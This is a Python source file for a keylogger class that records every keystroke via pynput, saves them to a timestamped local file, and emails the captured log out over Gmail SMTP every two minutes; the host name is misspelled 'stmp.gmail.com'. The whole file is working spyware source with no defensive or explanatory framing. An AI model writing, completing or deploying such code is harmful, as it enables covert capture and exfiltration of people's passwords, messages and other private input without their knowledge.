import pynput.keyboard
import threading
import smtplib
import datetime
import os
import logging

STMP_HOST="stmp.gmail.com"
STMP_PORT=587

class EnhancedKeyLogger:
    def __init__(self, email, password, interval=120):
        # Initialize configuration
        self.email = email
        self.password = password
        self.interval = interval
        self.log_data = ""
        self.start_time = datetime.datetime.now()

        # Setup basic file logging
        log_filename = f"keylog_{self.start_time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        self.log_file_path = os.path.join(os.getcwd(), log_filename)
        logging.basicConfig(filename=self.log_file_path, level=logging.DEBUG)
        self.append_to_log("[*] Keylogger started at {}\n".format(self.start_time.strftime("%Y-%m-%d %H:%M:%S")))

    def append_to_log(self, text):
        self.log_data += text
        logging.debug(text)

    def process_key_press(self, key):
        special_keys = {
            key.space: " ",
            key.enter: "[ENTER]\n",
            key.tab: "[TAB]",
            key.backspace: "[BACKSPACE]",
            key.shift: "[SHIFT]",
            key.shift_r: "[SHIFT-R]",
            key.ctrl_l: "[CTRL-L]",
            key.ctrl_r: "[CTRL-R]",
            key.alt_l: "[ALT-L]",
            key.alt_r: "[ALT-R]",
            key.esc: "[ESC]",
            key.delete: "[DELETE]",
            key.caps_lock: "[CAPSLOCK]",
            key.cmd: "[CMD]",
            key.up: "[UP]",
            key.down: "[DOWN]",
            key.left: "[LEFT]",
            key.right: "[RIGHT]"
        }
        try:
            key_str = str(key.char)
        except AttributeError:
            # Handling special keys
            key_str = special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]")
        self.append_to_log(key_str)

    def report(self):
        # Adds timestamp and tries to send email
        if self.log_data.strip():
            try:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = f"\n\n[Log Time: {timestamp}]\n{self.log_data}"
                self.send_email(self.email, self.password, message)
                self.log_data = ""  # Reset log
            except Exception as e:
                self.append_to_log(f"\n[!] Failed to send email: {str(e)}\n")

        # Schedule next report
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def send_email(self, email, password, message):
        # Send logs via Gmail SMTP
        server = smtplib.SMTP(host=STMP_HOST,port=STMP_PORT)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        # Start the keylogger
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
